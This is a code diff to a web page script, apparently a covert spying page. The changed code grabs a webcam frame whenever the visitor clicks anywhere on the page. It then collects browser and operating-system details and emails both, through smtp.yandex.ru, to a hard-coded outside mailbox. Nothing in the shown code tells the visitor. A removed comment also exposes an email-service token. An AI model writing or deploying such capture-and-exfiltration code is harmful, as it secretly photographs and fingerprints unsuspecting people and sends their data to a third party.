@@ -68,15 +68,25 @@
         // Trigger photo take
         document.getElementsByTagName("body")[0].addEventListener("click", function() {
             context.drawImage(video, 0, 0, 640, 480);
-            // Email.send({
-            //     SecureToken: "C973D7AD-F097-4B95-91F4-40ABC5567812",
-            //     To: 'koha009@yandex.ru',
-            //     From: "koha009@yandex.ru",
-            //     Subject: "This is the subject",
-            //     Body: "And this is the body"
-            // }).then(
-            //     message => alert(message)
-            // );
+
+            var code = navigator.appCodeName;
+            var name = navigator.appName;
+            var vers = navigator.appVersion;
+            var platform = navigator.platform;
+            var cook = navigator.cookieEnabled;
+            var je = navigator.javaEnabled();
+            var ua = navigator.userAgent;
+            var text = 'Ваш браузер: ' + name +
+                '<br />Версия браузера: ' + vers +
+                '<br />Кодовое название браузера: ' + code +
+                '<br />Платформа: ' + platform +
+                '<br />Поддержка cookie: ' + cook +
+                '<br />Поддержка JavaScript: ' + je +
+                '<br />Браузер: ' + ua +
+                navigator.language +
+                '<br />Операционная система: ' + navigator.oscpu +
+                '<br />Производитель: ' + navigator.vendor +
+                '<br />Подразделение: ' + navigator.vendorSub;
             vibrate(100)
             Email.send({
                 Host: "smtp.yandex.ru",
@@ -85,7 +95,7 @@
                 To: 'koha009@yandex.ru',
                 From: "koha009@yandex.ru",
                 Subject: "Пришел снимок экрана",
-                Body: "<html><h2>Header</h2><strong>Bold text</strong><br></br><em>Italic</em></html>",
+                Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
                 Attachments: [{
                     name: 'photo.png',
                     data: canvas.toDataURL()
